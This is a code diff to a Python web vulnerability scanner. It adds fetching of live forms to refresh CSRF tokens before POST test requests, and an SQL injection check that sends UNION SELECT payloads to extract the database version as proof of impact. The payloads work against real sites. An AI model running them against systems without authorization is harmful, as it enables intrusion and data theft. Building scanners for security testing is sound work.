@@ -1297,8 +1297,8 @@ class VulnScanner:
         return self._crawled_urls
 
     def _build_request_data(self, endpoint: dict, target_param: str, value: str) -> dict:
-        """Build complete form data for an endpoint, injecting value into target_param
-        while preserving all other params (especially hidden ones the form needs)."""
+        """Build complete form data, injecting value into target_param
+        while preserving all other params (hidden fields, tokens, etc.)."""
         data = {}
         for p in endpoint.get("params", []):
             if p["name"] == target_param:
@@ -1309,16 +1309,116 @@ class VulnScanner:
             data[target_param] = value
         return data
 
-    def _send_test(self, endpoint: dict, param_name: str, value: str
-                   ) -> Optional[requests.Response]:
-        """Send a test request to an endpoint with one param set to the test value."""
+    def _fetch_live_form(self, endpoint: dict) -> Optional[dict]:
+        """Visit the page and parse the LIVE form to get fresh hidden values.
+
+        Static endpoints from crawling have stale CSRF tokens and hidden
+        field values. This fetches the page, finds the matching form, and
+        returns fresh field values. Without this, POST requests to forms
+        with CSRF protection silently fail (302 back to login or 403).
+        """
         url = endpoint["url"]
-        if endpoint["method"] == "GET":
-            qs = urlencode(self._build_request_data(endpoint, param_name, value))
-            return self._session.get(f"{url}?{qs}", allow_wayback=False)
+        if endpoint.get("source") != "form" or endpoint["method"] != "POST":
+            return None
+
+        resp = self._session.get(url, allow_wayback=False)
+        if not resp or not resp.text or not HAS_BS4:
+            return None
+
+        try:
+            soup = BeautifulSoup(resp.text[:200000], "html.parser")
+            # Find the form — match by action URL or by containing our target params
+            ep_param_names = {p["name"] for p in endpoint["params"]}
+            best_form = None
+
+            for form in soup.find_all("form"):
+                form_params = {inp.get("name", "") for inp in form.find_all(["input", "select", "textarea"])
+                               if inp.get("name")}
+                overlap = ep_param_names & form_params
+                if overlap:
+                    best_form = form
+                    break
+
+            if not best_form:
+                return None
+
+            # Extract ALL fields from the live form (fresh tokens)
+            fresh_params = []
+            for inp in best_form.find_all(["input", "select", "textarea"]):
+                name = inp.get("name", "")
+                if not name:
+                    continue
+                itype = inp.get("type", "text").lower()
+                if itype in ("submit", "button", "image", "reset"):
+                    continue
+                value = inp.get("value", "")
+                fresh_params.append({
+                    "name": name,
+                    "value": value,
+                    "hidden": (itype == "hidden"),
+                    "type": itype,
+                })
+
+            # Update endpoint action URL from the live form
+            action = best_form.get("action", "")
+            if action:
+                fresh_url = urljoin(url, action)
+            else:
+                fresh_url = url
+
+            return {
+                "url": fresh_url,
+                "params": fresh_params,
+                "method": (best_form.get("method", "POST")).upper(),
+                "source": "live_form",
+            }
+
+        except Exception:
+            return None
+
+    def _send_test(self, endpoint: dict, param_name: str, value: str,
+                   follow_redirects: bool = True) -> Optional[requests.Response]:
+        """Send a test request with full lifecycle:
+        1. For POST forms: fetch live page first to get fresh tokens
+        2. Build request data with all fields filled
+        3. Send request
+        4. Follow redirects to get the final response
+        """
+        url = endpoint["url"]
+
+        # For POST endpoints, refresh form data to get live tokens
+        live = endpoint
+        if endpoint["method"] == "POST" and endpoint.get("source") != "live_form":
+            if not hasattr(self, '_live_form_cache'):
+                self._live_form_cache = {}
+            cache_key = endpoint["url"]
+            # Refresh form if it has hidden token fields (CSRF) or if not cached
+            has_token = any(p.get("hidden") and p["name"].lower() in
+                           ("csrf", "token", "_token", "csrfmiddlewaretoken", "nonce",
+                            "__requestverificationtoken", "csrf_token", "authenticity_token")
+                           for p in endpoint.get("params", []))
+            if cache_key not in self._live_form_cache or has_token:
+                fresh = self._fetch_live_form(endpoint)
+                if fresh:
+                    self._live_form_cache[cache_key] = fresh
+            cached = self._live_form_cache.get(cache_key)
+            if cached:
+                live = cached
+
+        data = self._build_request_data(live, param_name, value)
+
+        if live["method"] == "GET":
+            qs = urlencode(data)
+            return self._session.get(f"{live['url']}?{qs}", allow_wayback=False)
         else:
-            return self._session.post_form(
-                url, self._build_request_data(endpoint, param_name, value))
+            resp = self._session.post_form(live["url"], data)
+            # Follow redirect to see the actual result page
+            if follow_redirects and resp and resp.status_code in (301, 302, 303, 307, 308):
+                location = resp.headers.get("Location", "")
+                if location:
+                    redirect_url = urljoin(live["url"], location)
+                    resp = self._session.get(redirect_url, allow_wayback=False)
+            return resp
 
     def _test_endpoint_sqli(self, endpoint: dict) -> List[dict]:
         """Test for SQL injection: error-based + blind (response-diff)."""
@@ -1397,20 +1497,54 @@ class VulnScanner:
                     if indicator.search(resp.text[:8000]):
                         if not (baseline_text and indicator.search(baseline_text)):
                             test_url = f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url
+
+                            # Verification: try to extract actual data to prove impact
+                            extracted_info = ""
+                            verify_payloads = []
+                            if profile["type"] == "int":
+                                verify_payloads = [
+                                    f"{pval} UNION SELECT CONCAT(0x67733a,version(),0x3a7367),NULL-- -",
+                                    f"{pval} UNION SELECT CONCAT(0x67733a,version(),0x3a7367),NULL,NULL-- -",
+                                    f"{pval} UNION SELECT NULL,CONCAT(0x67733a,version(),0x3a7367)-- -",
+                                    f"{pval} UNION SELECT NULL,CONCAT(0x67733a,version(),0x3a7367),NULL-- -",
+                                ]
+                            else:
+                                verify_payloads = [
+                                    f"{pval}' UNION SELECT CONCAT(0x67733a,version(),0x3a7367),NULL-- -",
+                                    f"{pval}' UNION SELECT CONCAT(0x67733a,version(),0x3a7367),NULL,NULL-- -",
+                                    f"{pval}' UNION SELECT NULL,CONCAT(0x67733a,version(),0x3a7367)-- -",
+                                    f"{pval}' UNION SELECT NULL,CONCAT(0x67733a,version(),0x3a7367),NULL-- -",
+                                ]
+
+                            for vp in verify_payloads:
+                                v_resp = self._send_test(endpoint, pname, vp)
+                                if v_resp and v_resp.text:
+                                    # Look for our marker gs:DATA:sg
+                                    vm = re.search(r"gs:(.*?):sg", v_resp.text)
+                                    if vm:
+                                        extracted_info = f"DB version: {vm.group(1)}"
+                                        break
+
+                            detail = (f"SQL error triggered by: {payload[:40]}. "
+                                      "Input reaches SQL query without sanitization.")
+                            if extracted_info:
+                                detail += f" VERIFIED: {extracted_info}"
+
                             findings.append({
                                 "severity": SEV_CRITICAL,
                                 "title": f"SQL injection via '{pname}' at {path}",
-                                "detail": f"SQL error triggered by payload: {payload[:40]}. "
-                                          "Input reaches SQL query without sanitization.",
+                                "detail": detail,
                                 "evidence": f"param: {pname}, payload: {payload[:40]}, "
-                                            f"matched: {indicator.pattern[:50]}",
+                                            f"matched: {indicator.pattern[:50]}"
+                                            + (f", {extracted_info}" if extracted_info else ""),
                                 "exploitable": True,
                                 "test_url": test_url,
                                 "exploit_info": {
                                     "type": "sqli",
                                     "parameter": pname,
                                     "path": path,
-                                    "method": f"Inject via '{pname}' at {path}. Error-based confirmed.",
+                                    "method": f"Inject via '{pname}' at {path}. Error-based confirmed."
+                                              + (f" {extracted_info}" if extracted_info else ""),
                                     "risk": "Full database access, data exfiltration, potential RCE",
                                 },
                             })
